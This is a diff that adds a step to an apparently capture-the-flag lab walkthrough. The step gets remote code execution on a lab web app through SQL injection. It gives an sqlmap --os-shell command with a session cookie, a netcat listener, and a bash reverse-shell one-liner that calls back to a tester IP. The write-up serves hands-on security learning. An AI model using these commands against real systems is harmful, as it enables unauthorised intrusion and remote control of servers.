@@ -104,3 +104,20 @@ Operating system access:
     --os-shell          Prompt for an interactive operating system shell
     --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
 ```
+
+7. What program can the postgres user run as root using sudo? 
+First we need to do RCE, insert in your terminal: 
+```
+sqlmap -u "http://10.129.228.13/dashboard.php?search=any+query" --cookie="PHPSESSID=2feacs4fsqv5ag51igr7nvf7q6" --os-shell
+```
+This will help us to get a RCE, then turn on the netcat: nc -lvnp 4444
+And your sqlmap will a message will appear
+Like this:
+
+![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/a08961fb-c0c8-4e6f-9c81-aebbb08b41b9)
+
+You need to insert there: bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1"
+But rember change the ip, also in this reverse-shell like in command sqlmap, if you don't change the ip and --cookie u don't get access, you can find your cookie by press right click on your mouse inspect, then go to network there it is.
+But when you change everything you can see this:
+
+![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/157f16da-4ae7-4301-961c-5fb95cab94e4)
